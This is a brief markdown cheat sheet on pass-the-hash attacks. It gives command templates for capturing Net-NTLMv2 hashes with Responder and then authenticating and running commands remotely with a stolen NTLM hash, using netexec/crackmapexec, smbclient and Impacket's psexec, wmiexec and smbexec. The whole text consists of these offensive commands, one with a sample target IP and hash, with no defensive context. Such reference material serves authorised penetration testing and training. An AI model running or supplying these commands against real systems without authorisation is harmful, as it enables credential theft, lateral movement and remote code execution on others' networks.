# Pass The Hash

## Capture Net-NTLMv2 Hashes

Captures Net-NTLMv2 hashes via Responder.

```
responder -I <interface>
```

## Netexec with NTLM Hash

Performs network-wide authentication with an NTLM hash.

```
nxc <protocol> <ip> -u <user> -H <ntlm_hash>
```

* Example: `crackmapexec smb 192.168.1.100 -u admin -H 5e4b6d8f7c7a2b1c3d9e0f1a2b3c4d5e`

## SMBClient with NTLM Hash

Authenticates to SMB using an NTLM hash.

```
smbclient -U <user>%<ntlm_hash> //<ip>/<share>
```

## Impacket PSEXEC with NTLM Hash

Executes commands via SMB using an NTLM hash.

```
impacket-psexec -hashes <lm_hash>:<ntlm_hash> <user>@<ip>
```

## Impacket WMIEXEC with NTLM Hash

Executes commands via WMI using an NTLM hash.

```
impacket-wmiexec -hashes <lm_hash>:<ntlm_hash> <user>@<ip>
```

## Impacket SMBEXEC with NTLM Hash

Executes commands via SMB using an NTLM hash.

```
impacket-smbexec -hashes <lm_hash>:<ntlm_hash> <user>@<ip>
```
